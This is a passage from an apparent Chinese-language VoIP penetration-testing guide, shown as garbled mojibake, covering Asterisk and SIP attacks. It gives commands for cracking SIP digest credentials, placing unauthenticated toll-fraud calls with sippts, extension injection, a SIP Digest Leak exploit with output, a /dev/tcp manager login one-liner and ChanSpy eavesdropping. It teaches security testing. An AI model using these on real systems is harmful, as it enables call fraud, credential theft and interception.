<p>è¦è·å–è¿™äº›ä¿¡æ¯ï¼Œä½ å¯ä»¥ä½¿ç”¨å·¥å…·å¦‚Wiresharkã€tcpdump...ä½†ä¸€ä¸ª<strong>ä¸“é—¨åˆ›å»ºçš„å—…æ¢VoIPå¯¹è¯çš„å·¥å…·æ˜¯</strong> <a href="https://github.com/Seabreg/ucsniff"><strong>ucsniff</strong></a>ã€‚</p>
<p>{% hint style="danger" %}
è¯·æ³¨æ„ï¼Œå¦‚æœ<strong>SIPé€šä¿¡ä¸­ä½¿ç”¨äº†TLS</strong>ï¼Œä½ å°†æ— æ³•çœ‹åˆ°æ˜æ–‡çš„SIPé€šä¿¡ã€‚<br />
å¦‚æœä½¿ç”¨<strong>SRTP</strong>å’Œ<strong>ZRTP</strong>ï¼Œ<strong>RTPæ•°æ®åŒ…å°†ä¸ä¼šæ˜¯æ˜æ–‡</strong>ã€‚
{% endhint %}</p>
<h4 id="sipå‡­æ®å¯†ç æš´åŠ›ç ´è§£---ç¦»çº¿"><a class="header" href="#sipå‡­æ®å¯†ç æš´åŠ›ç ´è§£---ç¦»çº¿">SIPå‡­æ®ï¼ˆå¯†ç æš´åŠ›ç ´è§£ - ç¦»çº¿ï¼‰</a></h4>
<p><a href="basic-voip-protocols/sip-session-initiation-protocol.html#sip-register-example">æŸ¥çœ‹è¿™ä¸ªä¾‹å­ä»¥æ›´å¥½åœ°ç†è§£<strong>SIP REGISTERé€šä¿¡</strong></a>ï¼Œä»¥äº†è§£<strong>å‡­æ®æ˜¯å¦‚ä½•å‘é€çš„</strong>ã€‚</p>
<ul>
<li><strong><code>sipdump</code><strong>å’Œ</strong><code>sipcrack</code></strong>ï¼Œæ˜¯<strong>sipcrack</strong>çš„ä¸€éƒ¨åˆ†ï¼ˆ<code>apt-get install sipcrack</code>ï¼‰ï¼šè¿™äº›å·¥å…·å¯ä»¥<strong>ä»pcapä¸­æå–</strong>SIPåè®®ä¸­çš„<strong>æ‘˜è¦è®¤è¯</strong>å¹¶<strong>è¿›è¡Œæš´åŠ›ç ´è§£</strong>ã€‚</li>
</ul>
<pre><code class="language-bash">sipdump -p net-capture.pcap sip-creds.txt
sipcrack sip-creds.txt -w dict.txt
</code></pre>
<ul>
<li><strong><code>SIPPTS dump</code></strong> æ¥è‡ª <a href="https://github.com/Pepelux/sippts"><strong>sippts</strong></a><strong>:</strong> SIPPTS dump å¯ä»¥ä» pcap æ–‡ä»¶ä¸­æå–æ‘˜è¦è®¤è¯ã€‚</li>
</ul>
<pre><code class="language-bash">sippts dump -f capture.pcap -o data.txt
</code></pre>
<ul>
<li><strong><code>SIPPTS dcrack</code></strong> from <a href="https://github.com/Pepelux/sippts"><strong>sippts</strong></a><strong>:</strong> SIPPTS dcrack æ˜¯ä¸€ä¸ªç”¨äºç ´è§£é€šè¿‡ SIPPTS dump è·å¾—çš„æ‘˜è¦è®¤è¯çš„å·¥å…·ã€‚</li>
</ul>
<pre><code class="language-bash">sippts dcrack -f data.txt -w wordlist/rockyou.txt
</code></pre>
<ul>
<li><strong><code>SIPPTS tshark</code></strong> æ¥è‡ª <a href="https://github.com/Pepelux/sippts"><strong>sippts</strong></a><strong>:</strong> SIPPTS tshark ä» PCAP æ–‡ä»¶ä¸­æå– SIP åè®®çš„æ•°æ®ã€‚</li>
</ul>
<pre><code class="language-bash">sippts tshark -f capture.pcap [-filter auth]
</code></pre>
<h4 id="dtmf-ä»£ç "><a class="header" href="#dtmf-ä»£ç ">DTMF ä»£ç </a></h4>
<p><strong>ä¸ä»…å¯ä»¥åœ¨ç½‘ç»œæµé‡ä¸­æ‰¾åˆ° SIP å‡­æ®</strong>ï¼Œè¿˜å¯ä»¥æ‰¾åˆ°ç”¨äºè®¿é—® <strong>è¯­éŸ³é‚®ä»¶</strong> çš„ DTMF ä»£ç ã€‚<br />
è¿™äº›ä»£ç å¯ä»¥åœ¨ <strong>INFO SIP æ¶ˆæ¯</strong>ã€<strong>éŸ³é¢‘</strong> æˆ– <strong>RTP æ•°æ®åŒ…</strong> ä¸­å‘é€ã€‚å¦‚æœä»£ç åœ¨ RTP æ•°æ®åŒ…ä¸­ï¼Œæ‚¨å¯ä»¥å‰ªåˆ‡å¯¹è¯çš„é‚£éƒ¨åˆ†å¹¶ä½¿ç”¨å·¥å…· multimo æå–å®ƒä»¬ï¼š</p>
<pre><code class="language-bash">multimon -a DTMF -t wac pin.wav
</code></pre>
<h3 id="å…è´¹é€šè¯--asterisks-è¿æ¥é…ç½®é”™è¯¯"><a class="header" href="#å…è´¹é€šè¯--asterisks-è¿æ¥é…ç½®é”™è¯¯">å…è´¹é€šè¯ / Asterisks è¿æ¥é…ç½®é”™è¯¯</a></h3>
<p>åœ¨ Asterisk ä¸­ï¼Œå¯ä»¥å…è®¸æ¥è‡ª <strong>ç‰¹å®š IP åœ°å€</strong> çš„è¿æ¥æˆ–æ¥è‡ª <strong>ä»»ä½• IP åœ°å€</strong> çš„è¿æ¥ï¼š</p>
<pre><code>host=10.10.10.10
host=dynamic
</code></pre>
<p>å¦‚æœæŒ‡å®šäº†IPåœ°å€ï¼Œä¸»æœº<strong>å°†ä¸éœ€è¦æ¯éš”ä¸€æ®µæ—¶é—´å‘é€REGISTER</strong>è¯·æ±‚ï¼ˆåœ¨REGISTERæ•°æ®åŒ…ä¸­å‘é€çš„ç”Ÿå­˜æ—¶é—´é€šå¸¸ä¸º30åˆ†é’Ÿï¼Œè¿™æ„å‘³ç€åœ¨å…¶ä»–æƒ…å†µä¸‹ï¼Œç”µè¯å°†éœ€è¦æ¯30åˆ†é’ŸREGISTERä¸€æ¬¡ï¼‰ã€‚ç„¶è€Œï¼Œå®ƒéœ€è¦å¼€æ”¾ç«¯å£ä»¥å…è®¸VoIPæœåŠ¡å™¨è¿›è¡Œé€šè¯ã€‚</p>
<p>è¦å®šä¹‰ç”¨æˆ·ï¼Œå¯ä»¥å®šä¹‰ä¸ºï¼š</p>
<ul>
<li><strong><code>type=user</code></strong>ï¼šç”¨æˆ·åªèƒ½ä½œä¸ºç”¨æˆ·æ¥å¬ç”µè¯ã€‚</li>
<li><strong><code>type=friend</code></strong>ï¼šå¯ä»¥ä½œä¸ºå¯¹ç­‰æ–¹æ‹¨æ‰“ç”µè¯å¹¶ä½œä¸ºç”¨æˆ·æ¥å¬ï¼ˆä¸æ‰©å±•ä¸€èµ·ä½¿ç”¨ï¼‰</li>
<li><strong><code>type=peer</code></strong>ï¼šå¯ä»¥ä½œä¸ºå¯¹ç­‰æ–¹å‘é€å’Œæ¥æ”¶ç”µè¯ï¼ˆSIP-trunksï¼‰</li>
</ul>
<p>è¿˜å¯ä»¥é€šè¿‡ä¸å®‰å…¨å˜é‡å»ºç«‹ä¿¡ä»»ï¼š</p>
<ul>
<li><strong><code>insecure=port</code></strong>ï¼šå…è®¸é€šè¿‡IPéªŒè¯çš„å¯¹ç­‰è¿æ¥ã€‚</li>
<li><strong><code>insecure=invite</code></strong>ï¼šä¸éœ€è¦å¯¹INVITEæ¶ˆæ¯è¿›è¡Œèº«ä»½éªŒè¯</li>
<li><strong><code>insecure=port,invite</code></strong>ï¼šä¸¤è€…éƒ½å¯ä»¥</li>
</ul>
<p>{% hint style="warning" %}
å½“ä½¿ç”¨**<code>type=friend</code><strong>æ—¶ï¼Œ<strong>host</strong>å˜é‡çš„</strong>å€¼<strong>å°†</strong>ä¸è¢«ä½¿ç”¨**ï¼Œå› æ­¤å¦‚æœç®¡ç†å‘˜<strong>é”™è¯¯é…ç½®SIP-trunk</strong>ä½¿ç”¨è¯¥å€¼ï¼Œ<strong>ä»»ä½•äººéƒ½å°†èƒ½å¤Ÿè¿æ¥åˆ°å®ƒ</strong>ã€‚</p>
<p>ä¾‹å¦‚ï¼Œè¿™ç§é…ç½®å°†æ˜¯è„†å¼±çš„ï¼š<br />
<code>host=10.10.10.10</code><br />
<code>insecure=port,invite</code><br />
<code>type=friend</code>
{% endhint %}</p>
<h3 id="å…è´¹é€šè¯--asterisksä¸Šä¸‹æ–‡é”™è¯¯é…ç½®"><a class="header" href="#å…è´¹é€šè¯--asterisksä¸Šä¸‹æ–‡é”™è¯¯é…ç½®">å…è´¹é€šè¯ / Asterisksä¸Šä¸‹æ–‡é”™è¯¯é…ç½®</a></h3>
<p>åœ¨Asteriskä¸­ï¼Œ<strong>ä¸Šä¸‹æ–‡</strong>æ˜¯æ‹¨å·è®¡åˆ’ä¸­ä¸€ä¸ªå‘½åçš„å®¹å™¨æˆ–éƒ¨åˆ†ï¼Œ<strong>å°†ç›¸å…³çš„æ‰©å±•ã€æ“ä½œå’Œè§„åˆ™ç»„åˆåœ¨ä¸€èµ·</strong>ã€‚æ‹¨å·è®¡åˆ’æ˜¯Asteriskç³»ç»Ÿçš„æ ¸å¿ƒç»„ä»¶ï¼Œå› ä¸ºå®ƒå®šä¹‰äº†<strong>å¦‚ä½•å¤„ç†å’Œè·¯ç”±æ¥ç”µå’Œå»ç”µ</strong>ã€‚ä¸Šä¸‹æ–‡ç”¨äºç»„ç»‡æ‹¨å·è®¡åˆ’ã€ç®¡ç†è®¿é—®æ§åˆ¶ï¼Œå¹¶æä¾›ç³»ç»Ÿä¸åŒéƒ¨åˆ†ä¹‹é—´çš„åˆ†ç¦»ã€‚</p>
<p>æ¯ä¸ªä¸Šä¸‹æ–‡åœ¨é…ç½®æ–‡ä»¶ä¸­å®šä¹‰ï¼Œé€šå¸¸åœ¨**<code>extensions.conf</code>**æ–‡ä»¶ä¸­ã€‚ä¸Šä¸‹æ–‡ç”¨æ–¹æ‹¬å·è¡¨ç¤ºï¼Œä¸Šä¸‹æ–‡åç§°åŒ…å«åœ¨å…¶ä¸­ã€‚ä¾‹å¦‚ï¼š</p>
<pre><code class="language-bash">csharpCopy code[my_context]
</code></pre>
<p>åœ¨ä¸Šä¸‹æ–‡ä¸­ï¼Œæ‚¨å®šä¹‰æ‰©å±•ï¼ˆæ‹¨æ‰“å·ç çš„æ¨¡å¼ï¼‰å¹¶å°†å…¶ä¸ä¸€ç³»åˆ—æ“ä½œæˆ–åº”ç”¨ç¨‹åºå…³è”ã€‚è¿™äº›æ“ä½œå†³å®šäº†ç”µè¯çš„å¤„ç†æ–¹å¼ã€‚ä¾‹å¦‚ï¼š</p>
<pre><code class="language-scss">[my_context]
exten =&gt; 100,1,Answer()
exten =&gt; 100,n,Playback(welcome)
exten =&gt; 100,n,Hangup()
</code></pre>
<p>è¿™ä¸ªç¤ºä¾‹æ¼”ç¤ºäº†ä¸€ä¸ªç®€å•çš„ä¸Šä¸‹æ–‡ï¼Œç§°ä¸º "my_context"ï¼Œæ‰©å±•ä¸º "100"ã€‚å½“æœ‰äººæ‹¨æ‰“ 100 æ—¶ï¼Œç”µè¯å°†è¢«æ¥å¬ï¼Œæ’­æ”¾æ¬¢è¿æ¶ˆæ¯ï¼Œç„¶åç”µè¯å°†è¢«ç»ˆæ­¢ã€‚</p>
<p>è¿™æ˜¯ <strong>å¦ä¸€ä¸ªä¸Šä¸‹æ–‡</strong>ï¼Œå…è®¸ <strong>æ‹¨æ‰“ä»»ä½•å…¶ä»–å·ç </strong>ï¼š</p>
<pre><code class="language-scss">[external]
exten =&gt; _X.,1,Dial(SIP/trunk/${EXTEN})
</code></pre>
<p>å¦‚æœç®¡ç†å‘˜å°† <strong>é»˜è®¤ä¸Šä¸‹æ–‡</strong> å®šä¹‰ä¸ºï¼š</p>
<pre><code>[default]
include =&gt; my_context
include =&gt; external
</code></pre>
<p>{% hint style="warning" %}
ä»»ä½•äººéƒ½å¯ä»¥ä½¿ç”¨ <strong>æœåŠ¡å™¨æ‹¨æ‰“ä»»ä½•å…¶ä»–å·ç </strong>ï¼ˆæœåŠ¡å™¨çš„ç®¡ç†å‘˜å°†ä¸ºé€šè¯ä»˜è´¹ï¼‰ã€‚
{% endhint %}</p>
<p>{% hint style="danger" %}
æ­¤å¤–ï¼Œé»˜è®¤æƒ…å†µä¸‹ <strong><code>sip.conf</code></strong> æ–‡ä»¶åŒ…å« <strong><code>allowguest=true</code></strong>ï¼Œå› æ­¤ <strong>ä»»ä½•</strong> æ”»å‡»è€…åœ¨ <strong>æ²¡æœ‰è®¤è¯</strong> çš„æƒ…å†µä¸‹éƒ½èƒ½å¤Ÿæ‹¨æ‰“ä»»ä½•å…¶ä»–å·ç ã€‚
{% endhint %}</p>
<ul>
<li><strong><code>SIPPTS invite</code></strong> æ¥è‡ª <a href="https://github.com/Pepelux/sippts"><strong>sippts</strong></a><strong>:</strong> SIPPTS invite æ£€æŸ¥ <strong>PBX æœåŠ¡å™¨æ˜¯å¦å…è®¸æˆ‘ä»¬åœ¨æ²¡æœ‰è®¤è¯çš„æƒ…å†µä¸‹æ‹¨æ‰“ç”µè¯</strong>ã€‚å¦‚æœ SIP æœåŠ¡å™¨é…ç½®ä¸æ­£ç¡®ï¼Œå®ƒå°†å…è®¸æˆ‘ä»¬æ‹¨æ‰“å¤–éƒ¨å·ç ã€‚å®ƒè¿˜å¯ä»¥å…è®¸æˆ‘ä»¬å°†é€šè¯è½¬ç§»åˆ°ç¬¬äºŒä¸ªå¤–éƒ¨å·ç ã€‚</li>
</ul>
<p>ä¾‹å¦‚ï¼Œå¦‚æœæ‚¨çš„ Asterisk æœåŠ¡å™¨æœ‰ä¸è‰¯çš„ä¸Šä¸‹æ–‡é…ç½®ï¼Œæ‚¨å¯ä»¥åœ¨æ²¡æœ‰æˆæƒçš„æƒ…å†µä¸‹æ¥å— INVITE è¯·æ±‚ã€‚åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œæ”»å‡»è€…å¯ä»¥åœ¨ä¸çŸ¥é“ä»»ä½•ç”¨æˆ·/å¯†ç çš„æƒ…å†µä¸‹æ‹¨æ‰“ç”µè¯ã€‚</p>
<p>{% code overflow="wrap" %}</p>
<pre><code class="language-bash"># Trying to make a call to the number 555555555 (without auth) with source number 200.
sippts invite -i  10.10.0.10 -fu 200 -tu 555555555 -v

# Trying to make a call to the number 555555555 (without auth) and transfer it to number 444444444.
sippts invite -i 10.10.0.10 -tu 555555555 -t 444444444
</code></pre>
<p>{% endcode %}</p>
<h3 id="å…è´¹ç”µè¯--é…ç½®é”™è¯¯çš„-ivrs"><a class="header" href="#å…è´¹ç”µè¯--é…ç½®é”™è¯¯çš„-ivrs">å…è´¹ç”µè¯ / é…ç½®é”™è¯¯çš„ IVRS</a></h3>
<p>IVRS ä»£è¡¨ <strong>äº¤äº’å¼è¯­éŸ³å“åº”ç³»ç»Ÿ</strong>ï¼Œæ˜¯ä¸€ç§ç”µè¯æŠ€æœ¯ï¼Œå…è®¸ç”¨æˆ·é€šè¿‡è¯­éŸ³æˆ–æŒ‰é”®è¾“å…¥ä¸è®¡ç®—æœºç³»ç»Ÿè¿›è¡Œäº¤äº’ã€‚IVRS ç”¨äºæ„å»º <strong>è‡ªåŠ¨å‘¼å«å¤„ç†</strong> ç³»ç»Ÿï¼Œæä¾›ä¸€ç³»åˆ—åŠŸèƒ½ï¼Œä¾‹å¦‚æä¾›ä¿¡æ¯ã€è·¯ç”±ç”µè¯å’Œæ•è·ç”¨æˆ·è¾“å…¥ã€‚</p>
<p>VoIP ç³»ç»Ÿä¸­çš„ IVRS é€šå¸¸åŒ…æ‹¬ï¼š</p>
<ol>
<li><strong>è¯­éŸ³æç¤º</strong>ï¼šå¼•å¯¼ç”¨æˆ·é€šè¿‡ IVR èœå•é€‰é¡¹å’Œè¯´æ˜çš„é¢„å½•éŸ³é¢‘æ¶ˆæ¯ã€‚</li>
<li><strong>DTMF</strong>ï¼ˆåŒéŸ³å¤šé¢‘ï¼‰ä¿¡å·ï¼šé€šè¿‡æŒ‰ä¸‹ç”µè¯ä¸Šçš„æŒ‰é”®ç”Ÿæˆçš„è§¦æ‘¸éŸ³è¾“å…¥ï¼Œç”¨äºåœ¨ IVR èœå•ä¸­å¯¼èˆªå’Œæä¾›è¾“å…¥ã€‚</li>
<li><strong>å‘¼å«è·¯ç”±</strong>ï¼šæ ¹æ®ç”¨æˆ·è¾“å…¥å°†ç”µè¯ç›´æ¥è½¬æ¥åˆ°é€‚å½“çš„ç›®çš„åœ°ï¼Œä¾‹å¦‚ç‰¹å®šéƒ¨é—¨ã€ä»£ç†æˆ–åˆ†æœºã€‚</li>
<li><strong>ç”¨æˆ·è¾“å…¥æ•è·</strong>ï¼šæ”¶é›†æ¥ç”µè€…çš„ä¿¡æ¯ï¼Œä¾‹å¦‚è´¦æˆ·å·ç ã€æ¡ˆä»¶ ID æˆ–ä»»ä½•å…¶ä»–ç›¸å…³æ•°æ®ã€‚</li>
<li><strong>ä¸å¤–éƒ¨ç³»ç»Ÿçš„é›†æˆ</strong>ï¼šå°† IVR ç³»ç»Ÿè¿æ¥åˆ°æ•°æ®åº“æˆ–å…¶ä»–è½¯ä»¶ç³»ç»Ÿï¼Œä»¥è®¿é—®æˆ–æ›´æ–°ä¿¡æ¯ã€æ‰§è¡Œæ“ä½œæˆ–è§¦å‘äº‹ä»¶ã€‚</li>
</ol>
<p>åœ¨ Asterisk VoIP ç³»ç»Ÿä¸­ï¼Œæ‚¨å¯ä»¥ä½¿ç”¨æ‹¨å·è®¡åˆ’ï¼ˆ<strong><code>extensions.conf</code></strong> æ–‡ä»¶ï¼‰å’Œå„ç§åº”ç”¨ç¨‹åºï¼ˆå¦‚ <code>Background()</code>ã€<code>Playback()</code>ã€<code>Read()</code> ç­‰ï¼‰åˆ›å»º IVRã€‚è¿™äº›åº”ç”¨ç¨‹åºå¸®åŠ©æ‚¨æ’­æ”¾è¯­éŸ³æç¤ºã€æ•è·ç”¨æˆ·è¾“å…¥å¹¶æ§åˆ¶å‘¼å«æµç¨‹ã€‚</p>
<h4 id="æ˜“å—æ”»å‡»çš„é…ç½®ç¤ºä¾‹"><a class="header" href="#æ˜“å—æ”»å‡»çš„é…ç½®ç¤ºä¾‹">æ˜“å—æ”»å‡»çš„é…ç½®ç¤ºä¾‹</a></h4>
<pre><code class="language-scss">exten =&gt; 0,100,Read(numbers,the_call,,,,5)
exten =&gt; 0,101,GotoIf("$[${numbers}"="1"]?200)
exten =&gt; 0,102,GotoIf("$[${numbers}"="2"]?300)
exten =&gt; 0,103,GotoIf("$[${numbers}"=""]?100)
exten =&gt; 0,104,Dial(LOCAL/${numbers})
</code></pre>
<p>ä¹‹å‰çš„ä¾‹å­ä¸­ï¼Œç”¨æˆ·è¢«è¦æ±‚<strong>æŒ‰1æ‹¨æ‰“</strong>ä¸€ä¸ªéƒ¨é—¨ï¼Œ<strong>æŒ‰2æ‹¨æ‰“</strong>å¦ä¸€ä¸ªéƒ¨é—¨ï¼Œæˆ–è€…<strong>å¦‚æœä»–çŸ¥é“å®Œæ•´çš„åˆ†æœºå·</strong>ï¼Œåˆ™è¾“å…¥å®Œæ•´çš„åˆ†æœºå·ã€‚<br />
æ¼æ´åœ¨äºæ‰€æŒ‡ç¤ºçš„<strong>åˆ†æœºé•¿åº¦æ²¡æœ‰è¢«æ£€æŸ¥ï¼Œå› æ­¤ç”¨æˆ·å¯ä»¥è¾“å…¥5ç§’è¶…æ—¶çš„å®Œæ•´å·ç å¹¶è¿›è¡Œæ‹¨æ‰“ã€‚</strong></p>
<h3 id="åˆ†æœºæ³¨å…¥"><a class="header" href="#åˆ†æœºæ³¨å…¥">åˆ†æœºæ³¨å…¥</a></h3>
<p>ä½¿ç”¨å¦‚ä¸‹åˆ†æœºï¼š</p>
<pre><code class="language-scss">exten =&gt; _X.,1,Dial(SIP/${EXTEN})
</code></pre>
<p>å½“ <strong><code>${EXTEN}</code></strong> æ˜¯å°†è¢«æ‹¨æ‰“çš„ <strong>åˆ†æœº</strong> æ—¶ï¼Œå½“ <strong>ext 101 è¢«å¼•å…¥</strong> æ—¶ï¼Œå°†ä¼šå‘ç”Ÿä»¥ä¸‹æƒ…å†µï¼š</p>
<pre><code class="language-scss">exten =&gt; 101,1,Dial(SIP/101)
</code></pre>
<p>ç„¶è€Œï¼Œå¦‚æœ <strong><code>${EXTEN}</code></strong> å…è®¸è¾“å…¥ <strong>è¶…è¿‡æ•°å­—</strong>ï¼ˆå¦‚åœ¨æ—§ç‰ˆ Asterisk ä¸­ï¼‰ï¼Œæ”»å‡»è€…å¯ä»¥è¾“å…¥ <strong><code>101&amp;SIP123123123</code></strong> æ¥æ‹¨æ‰“ç”µè¯å·ç  123123123ã€‚è¿™å°†æ˜¯ç»“æœï¼š</p>
<pre><code class="language-scss">exten =&gt; 101&amp;SIP123123123,1,Dial(SIP/101&amp;SIP123123123)
</code></pre>
<p>å› æ­¤ï¼Œå¯¹åˆ†æœº <strong><code>101</code></strong> å’Œ <strong><code>123123123</code></strong> çš„å‘¼å«å°†è¢«å‘é€ï¼Œåªæœ‰ç¬¬ä¸€ä¸ªæ¥åˆ°ç”µè¯çš„åˆ†æœºä¼šå»ºç«‹è¿æ¥â€¦â€¦ä½†æ˜¯å¦‚æœæ”»å‡»è€…ä½¿ç”¨ä¸€ä¸ª <strong>ç»•è¿‡ä»»ä½•åŒ¹é…</strong> çš„åˆ†æœºï¼Œè¯¥åˆ†æœºå¹¶ä¸å­˜åœ¨ï¼Œä»–å¯ä»¥ <strong>ä»…å‘æ‰€éœ€å·ç æ³¨å…¥ä¸€ä¸ªå‘¼å«</strong>ã€‚</p>
<h2 id="sipdigestleak-æ¼æ´"><a class="header" href="#sipdigestleak-æ¼æ´">SIPDigestLeak æ¼æ´</a></h2>
<p>SIP Digest Leak æ˜¯ä¸€ä¸ªå½±å“å¤§é‡ SIP ç”µè¯çš„æ¼æ´ï¼ŒåŒ…æ‹¬ç¡¬ä»¶å’Œè½¯ä»¶ IP ç”µè¯ä»¥åŠç”µè¯é€‚é…å™¨ï¼ˆVoIP è½¬æ¨¡æ‹Ÿï¼‰ã€‚è¯¥æ¼æ´å…è®¸ <strong>æ³„éœ² Digest è®¤è¯å“åº”</strong>ï¼Œè¯¥å“åº”æ˜¯æ ¹æ®å¯†ç è®¡ç®—çš„ã€‚ç„¶åå¯ä»¥è¿›è¡Œ <strong>ç¦»çº¿å¯†ç æ”»å‡»</strong>ï¼Œå¹¶æ ¹æ®æŒ‘æˆ˜å“åº”æ¢å¤å¤§å¤šæ•°å¯†ç ã€‚</p>
<p>**<a href="https://resources.enablesecurity.com/resources/sipdigestleak-tut.pdf">æ¼æ´åœºæ™¯æ¥è‡ªè¿™é‡Œ**</a>:</p>
<ol>
<li>ä¸€éƒ¨ IP ç”µè¯ï¼ˆå—å®³è€…ï¼‰åœ¨ä»»ä½•ç«¯å£ä¸Šç›‘å¬ï¼ˆä¾‹å¦‚ï¼š5060ï¼‰ï¼Œæ¥å—ç”µè¯å‘¼å«</li>
<li>æ”»å‡»è€…å‘ IP ç”µè¯å‘é€ INVITE</li>
<li>å—å®³è€…ç”µè¯å¼€å§‹å“é“ƒï¼Œæœ‰äººæ¥å¬å¹¶æŒ‚æ–­ï¼ˆå› ä¸ºå¦ä¸€ç«¯æ²¡æœ‰äººæ¥ç”µè¯ï¼‰</li>
<li>å½“ç”µè¯æŒ‚æ–­æ—¶ï¼Œ<strong>å—å®³è€…ç”µè¯å‘æ”»å‡»è€…å‘é€ BYE</strong></li>
<li><strong>æ”»å‡»è€…å‘å‡º 407 å“åº”</strong>ï¼Œ<strong>è¯·æ±‚è®¤è¯</strong>å¹¶å‘å‡ºè®¤è¯æŒ‘æˆ˜</li>
<li><strong>å—å®³è€…ç”µè¯åœ¨ç¬¬äºŒä¸ª BYE ä¸­æä¾›å¯¹è®¤è¯æŒ‘æˆ˜çš„å“åº”</strong></li>
<li><strong>æ”»å‡»è€…å¯ä»¥åœ¨ä»–çš„æœ¬åœ°æœºå™¨ä¸Šï¼ˆæˆ–åˆ†å¸ƒå¼ç½‘ç»œç­‰ï¼‰å¯¹æŒ‘æˆ˜å“åº”è¿›è¡Œæš´åŠ›ç ´è§£æ”»å‡»</strong>å¹¶çŒœæµ‹å¯†ç </li>
</ol>
<ul>
<li><strong>SIPPTS æ¼æ´</strong>æ¥è‡ª <a href="https://github.com/Pepelux/sippts"><strong>sippts</strong></a><strong>:</strong> SIPPTS æ¼æ´åˆ©ç”¨äº†å½±å“å¤§é‡ SIP ç”µè¯çš„ SIP Digest Leak æ¼æ´ã€‚è¾“å‡ºå¯ä»¥ä»¥ SipCrack æ ¼å¼ä¿å­˜ï¼Œä»¥ä¾¿ä½¿ç”¨ SIPPTS dcrack æˆ– SipCrack å·¥å…·è¿›è¡Œæš´åŠ›ç ´è§£ã€‚</li>
</ul>
<pre><code class="language-bash">sippts leak -i 10.10.0.10

[!] Target: 10.10.0.10:5060/UDP
[!] Caller: 100
[!] Callee: 100

[=&gt;] Request INVITE
[&lt;=] Response 100 Trying
[&lt;=] Response 180 Ringing
[&lt;=] Response 200 OK
[=&gt;] Request ACK
... waiting for BYE ...
[&lt;=] Received BYE
[=&gt;] Request 407 Proxy Authentication Required
[&lt;=] Received BYE with digest
[=&gt;] Request 200 Ok

Auth=Digest username="pepelux", realm="asterisk", nonce="lcwnqoz0", uri="sip:100@10.10.0.10:56583;transport=UDP", response="31fece0d4ff6fd524c1d4c9482e99bb2", algorithm=MD5
</code></pre>
<h3 id="click2call"><a class="header" href="#click2call">Click2Call</a></h3>
<p>Click2Call å…è®¸ä¸€ä¸ª <strong>ç½‘ç»œç”¨æˆ·</strong>ï¼ˆä¾‹å¦‚å¯èƒ½å¯¹æŸä¸ªäº§å“æ„Ÿå…´è¶£ï¼‰ <strong>æä¾›</strong> ä»–çš„ <strong>ç”µè¯å·ç </strong> ä»¥æ¥æ”¶ç”µè¯ã€‚ç„¶åä¼šæ‹¨æ‰“ä¸€ä¸ªå•†ä¸šç”µè¯ï¼Œå½“ä»– <strong>æ¥å¬ç”µè¯</strong> æ—¶ï¼Œç”¨æˆ·å°† <strong>è¢«å‘¼å«å¹¶ä¸ä»£ç†è¿æ¥</strong>ã€‚</p>
<p>ä¸€ä¸ªå¸¸è§çš„ Asterisk é…ç½®æ–‡ä»¶æ˜¯ï¼š</p>
<pre><code class="language-scss">[web_user]
secret = complex_password
deny = 0.0.0.0/0.0.0.0
allow = 0.0.0.0/0.0.0.0
displayconnects = yes
read = system,call,log,verbose,agent,user,config,dtmf,reporting,crd,diapla
write = system,call,agent,user,config,command,reporting,originate
</code></pre>
<ul>
<li>ä¹‹å‰çš„é…ç½®å…è®¸ <strong>ä»»ä½• IP åœ°å€è¿æ¥</strong>ï¼ˆå¦‚æœå·²çŸ¥å¯†ç ï¼‰ã€‚</li>
<li>è¦ <strong>ç»„ç»‡ä¸€ä¸ªç”µè¯</strong>ï¼Œå¦‚å‰æ‰€è¿°ï¼Œ<strong>ä¸éœ€è¦è¯»å–æƒé™</strong>ï¼Œ<strong>åªéœ€è¦</strong> <strong>åœ¨</strong> <strong>å†™å…¥</strong> ä¸­ <strong>å‘èµ·</strong>ã€‚</li>
</ul>
<p>æ‹¥æœ‰è¿™äº›æƒé™çš„ä»»ä½•çŸ¥é“å¯†ç çš„ IP éƒ½å¯ä»¥è¿æ¥å¹¶æå–è¿‡å¤šä¿¡æ¯ï¼Œä¾‹å¦‚ï¼š</p>
<p>{% code overflow="wrap" %}</p>
<pre><code class="language-bash"># Get all the peers
exec 3&lt;&gt;/dev/tcp/10.10.10.10/5038 &amp;&amp; echo -e "Action: Login\nUsername:test\nSecret:password\nEvents: off\n\nAction:Command\nCommand: sip show peers\n\nAction: logoff\n\n"&gt;&amp;3 &amp;&amp; cat &lt;&amp;3
</code></pre>
<p>{% endcode %}</p>
<p><strong>å¯ä»¥è¯·æ±‚æ›´å¤šä¿¡æ¯æˆ–æ“ä½œã€‚</strong></p>
<h3 id="çªƒå¬"><a class="header" href="#çªƒå¬"><strong>çªƒå¬</strong></a></h3>
<p>åœ¨ Asterisk ä¸­ï¼Œå¯ä»¥ä½¿ç”¨å‘½ä»¤ <strong><code>ChanSpy</code></strong> æŒ‡å®šè¦ç›‘æ§çš„ <strong>åˆ†æœº</strong>ï¼ˆæˆ–æ‰€æœ‰åˆ†æœºï¼‰æ¥å¬å–æ­£åœ¨è¿›è¡Œçš„å¯¹è¯ã€‚æ­¤å‘½ä»¤éœ€è¦åˆ†é…ç»™ä¸€ä¸ªåˆ†æœºã€‚</p>
<p>ä¾‹å¦‚ï¼Œ<strong><code>exten =&gt; 333,1,ChanSpy('all',qb)</code></strong> è¡¨ç¤ºå¦‚æœæ‚¨ <strong>æ‹¨æ‰“</strong> <strong>åˆ†æœº 333</strong>ï¼Œå®ƒå°† <strong>ç›‘æ§</strong> <strong><code>all</code></strong> åˆ†æœºï¼Œ<strong>å¼€å§‹ç›‘å¬</strong> æ¯å½“æ–°çš„å¯¹è¯å¼€å§‹æ—¶ (<strong><code>b</code></strong>) ä»¥é™éŸ³æ¨¡å¼ (<strong><code>q</code></strong>) è¿›è¡Œï¼Œå› ä¸ºæˆ‘ä»¬ä¸æƒ³å‚ä¸å…¶ä¸­ã€‚æ‚¨å¯ä»¥é€šè¿‡æŒ‰ <strong><code>*</code></strong> æˆ–æ ‡è®°åˆ†æœºå·ç åœ¨è¿›è¡Œä¸­çš„å¯¹è¯ä¹‹é—´åˆ‡æ¢ã€‚</p>
<p>ä¹Ÿå¯ä»¥ä½¿ç”¨ <strong><code>ExtenSpy</code></strong> ä»…ç›‘æ§ä¸€ä¸ªåˆ†æœºã€‚</p>
<p>é™¤äº†ç›‘å¬å¯¹è¯å¤–ï¼Œè¿˜å¯ä»¥ä½¿ç”¨åˆ†æœºå°†å…¶ <strong>å½•åˆ¶åˆ°æ–‡ä»¶ä¸­</strong>ï¼Œä¾‹å¦‚ï¼š</p>
<p>{% code overflow="wrap" %}</p>
<pre><code class="language-scss">[recorded-context]
